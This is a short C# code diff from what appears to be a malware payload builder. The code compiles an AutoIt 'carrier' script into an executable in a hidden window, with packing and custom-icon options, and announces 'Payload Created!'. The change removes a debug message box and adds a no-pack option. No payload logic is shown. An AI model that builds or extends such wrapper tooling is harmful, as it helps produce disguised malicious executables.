@@ -31,15 +31,14 @@ namespace masamangalternatibo {
                     _sw.Close();
                 }
                 using (Form1 _f1 = new Form1()) {
-                    ProcessStartInfo _compilepsi = new ProcessStartInfo("compiler.exe", @"/in ""$carrier.au3"" /out ""$carrier.exe"" /comp 4 " + (rb32bit.Checked ? "/x86 " : "/x64 ") + (_f1.excomp[1] ? @"/pack " : "") + (isicon ? @"/icon ""$tmp.ico""" : ""));
-                    MessageBox.Show(_compilepsi.Arguments);
+                    ProcessStartInfo _compilepsi = new ProcessStartInfo("compiler.exe", @"/in ""$carrier.au3"" /out ""$carrier.exe"" /comp 4 " + (rb32bit.Checked ? "/x86 " : "/x64 ") + (_f1.excomp[1] ? @"/pack " : "/nopack") + (isicon ? @"/icon ""$tmp.ico""" : ""));
                     _compilepsi.WindowStyle = ProcessWindowStyle.Hidden;
                     Process _cpsihndl = Process.Start(_compilepsi);
                     _cpsihndl.WaitForExit();
                     if (File.Exists("$carrier.exe")) {
                         File.Move("$carrier.exe", flnmexport);
                         if (MessageBox.Show("Payload Created!\n\nExport: " + flnmexport + "\n\nOpen payload directory?", "Build Finished", MessageBoxButtons.YesNo) == DialogResult.Yes) {
-                            Process.Start(drive);
+                                Process.Start(drive);
                         }
                         this.Close();
                     }
